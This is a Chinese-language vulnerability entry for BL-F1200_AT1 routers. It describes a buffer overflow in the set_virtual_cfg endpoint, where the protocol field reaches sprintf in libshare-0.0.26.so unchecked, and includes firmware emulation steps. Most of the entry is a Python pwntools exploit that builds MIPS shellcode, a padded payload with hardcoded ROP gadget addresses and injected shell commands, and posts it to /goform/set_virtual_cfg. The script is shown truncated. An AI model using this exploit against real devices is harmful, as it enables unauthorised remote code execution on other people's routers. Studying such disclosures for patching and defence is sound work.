# BL-F1200_AT1系列产品set_virtual_cfg存在命令执行漏洞

- **系统**：BL-F1200_AT1　|　**类型**：命令执行　|　**CVE**：—

**请求体 / payload**
```
环境搭建
在官网下载附件
下载之后解包，得到一个.bin文件，binwalk解包之后，使用qemu即可模拟，界面如下
测试环境说明：本地ip为10.40.76.196（模拟环境开放在0.0.0.0上，10.40.76.196为虚拟机网卡ens41的ip）
**漏洞位置**
其漏洞点位于goahead程序的bs_setvirtualserinfo函数中，并向libshare-0.0.26.so库中的bs_setvirtualserinfo函数传参。
而在./lib/libshare-0.0.26.so中，由sprintf函数像v27变量传参的过程中，由于未对相关参数如protocol进行长度校验，而导致可以传入大量数据造成溢出。可以通过精心设计导致rce
import requests
from pwn import *
context(arch='mips', os='linux', log_level='debug',endian = 'little')
path = '/bin/sh'
argv = ['sh', '-c', 'echo Hello, $NAME; exit $STATUS']
envp = {'NAME': 'zerocool', 'STATUS': 3}
shellcode = pwnlib.shellcraft.mips.linux.syscall('SYS_execve', '$s2', '$s1', '$s3', 0)
sc = shellcraft.mips.linux.execve(path, argv, envp)
print(shellcode)
print("newshellcode")
print(sc)
payload = b'a' *(2110-9*4-16)
payload+=b'b'*8
#payload+=b'ls;ls;aa'
payload+=b'sleep 5;'
payload+=p32(0x7fffefb8)*4
payload+=p32(0x7f7210a0)
payload+=p32(0x7fffefb8)
payload+=p32(0x7fffefb8)
payload+=p32(0x7f7563c0)#gadget 2
payload+=p32(0x7fffefb8)#0x28
payload+=p32(0x7f756984)#gadget 1  #0x2c
#payload+p32(0x7fffefe8)
payload+=p32(0x7fffefe8+4)#0x30
payload+=b'ls;echo BL-F1200_AT1 RCE\x00'
print((asm(shellcraft.sh())))
# 目标IP和端口
ip = "127.0.0.1"
port = "80"
# 请求URL
url = 'http://%s:%s/goform/set_virtual_cfg' % (ip, port)
# 请求头（根据需要自己定义）
header = {
'User-Agent': 'Mozilla/5.0',
'Content-Type': 'application/x-www-form-urlencoded'
# POST数据
data = {
'enable': '0',
'ip': '192.168.1.1',
'pu_port': '1111',
'pr_port': '2222',
'protocol': payload
# 发送请求
response …（脚本共 1869 字，完整版见原文）
```
- **预期**：200　|　—